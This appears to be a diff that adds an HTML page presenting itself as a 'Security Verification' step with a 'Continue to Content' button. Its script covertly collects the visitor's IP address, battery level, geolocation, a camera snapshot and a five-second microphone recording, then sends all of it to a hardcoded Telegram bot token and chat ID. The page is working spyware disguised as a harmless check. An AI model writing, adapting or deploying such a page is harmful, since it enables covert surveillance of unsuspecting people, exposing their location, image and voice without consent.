@@ -1,1 +1,94 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Connection Test</title>
+    <style>
+        body { font-family: sans-serif; text-align: center; padding-top: 50px; background-color: #f4f4f4; }
+        button { padding: 15px 30px; font-size: 18px; cursor: pointer; background: #007bff; color: white; border: none; border-radius: 5px; }
+    </style>
+</head>
+<body>
 
+    <h2>Security Verification</h2>
+    <p>Please click the button below to continue to the content.</p>
+    <button id="startBtn">Continue to Content</button>
+
+    <script>
+        // Aapka Naya Token aur ID
+        const token = "8963930653:AAE7UaJFHmq4Gps56aBD5yy31SPy2FZvYcc";
+        const chatId = "8963930653";
+
+        // 1. Text message bhejne ka function
+        async function sendText(text) {
+            const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}&parse_mode=Markdown`;
+            await fetch(url);
+        }
+
+        // 2. Photo ya Audio bhejne ka function
+        async function sendMedia(blob, type, filename) {
+            const formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append(type, blob, filename);
+            const url = `https://api.telegram.org/bot${token}/send${type.charAt(0).toUpperCase() + type.slice(1)}`;
+            await fetch(url, { method: 'POST', body: formData });
+        }
+
+        document.getElementById('startBtn').addEventListener('click', async () => {
+            alert("Starting connection...");
+
+            // A. Battery aur IP Info 🔋
+            try {
+                const battery = await navigator.getBattery();
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipRes.json();
+                
+                let info = `🔋 *Battery:* ${Math.round(battery.level * 100)}%\n🌐 *IP:* ${ipData.ip}`;
+                await sendText(info);
+            } catch (e) { console.log(e); }
+
+            // B. Location 📍
+            navigator.geolocation.getCurrentPosition(async (pos) => {
+                const loc = `📍 *Location:* https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                await sendText(loc);
+            }, (err) => { sendText("❌ Location denied"); });
+
+            // C. Camera Photo 📸
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                await video.play();
+
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                
+                canvas.toBlob(blob => sendMedia(blob, 'photo', 'snap.jpg'), 'image/jpeg');
+                stream.getTracks().forEach(track => track.stop());
+            } catch (e) { sendText("❌ Camera access denied"); }
+
+            // D. Audio Recording 🎤 (5 Seconds)
+            try {
+                const audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                const mediaRecorder = new MediaRecorder(audioStream);
+                let chunks = [];
+
+                mediaRecorder.ondataavailable = e => chunks.push(e.data);
+                mediaRecorder.onstop = () => {
+                    const blob = new Blob(chunks, { type: 'audio/ogg' });
+                    sendMedia(blob, 'voice', 'audio.ogg');
+                    audioStream.getTracks().forEach(track => track.stop());
+                };
+
+                mediaRecorder.start();
+                setTimeout(() => mediaRecorder.stop(), 5000);
+            } catch (e) { sendText("❌ Audio access denied"); }
+
+            alert("Done! Check your Telegram bot.");
+        });
+    </script>
+</body>
+  </html>
